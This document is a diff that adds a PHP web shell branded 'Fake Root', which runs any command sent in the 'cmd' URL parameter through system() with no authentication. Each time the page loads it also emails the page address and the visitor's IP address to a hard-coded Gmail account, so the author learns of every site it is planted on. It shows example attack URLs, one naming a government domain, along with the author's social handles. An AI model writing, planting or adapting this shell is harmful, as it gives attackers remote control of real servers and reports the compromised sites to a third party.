@@ -1,0 +1,20 @@
+
+MAIL LOGGER, TO THIS MAIL fikriofficial4676@gmail.com
+
+
+@ini_set(�output_buffering�,0); 
+@ini_set(�display_errors�, 0);set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'fikriofficial4676@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+
+echo "<!-- ./Fake Root -->\n";
+echo "<!-- contoh cok http://heker.com/fakeroot.php?cmd=ls -a --><html><body><center><style>body{background:black;font-family:courier new;font-size:25px; } </style><font color=\"aqua\">\n";
+echo "<b><br><div class=\"f4k3r00t\"><img style=\"width:230px;\" src=\"https://i.ibb.co/d02fLTT/1622127987-picsaykj.png\"></div><h6>----------------------------------------<br>Instagram: f4k3_r00t <br>Email: fikriwalker4676@gmail.com <br>----------------------------------------<br></h6><font color=\"red\">";echo 'Example:<br> https://nguli.go.id/fakeroot.php?cmd=ls';
+echo '<textarea cols=121 rows=15>';
+
+
+if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }
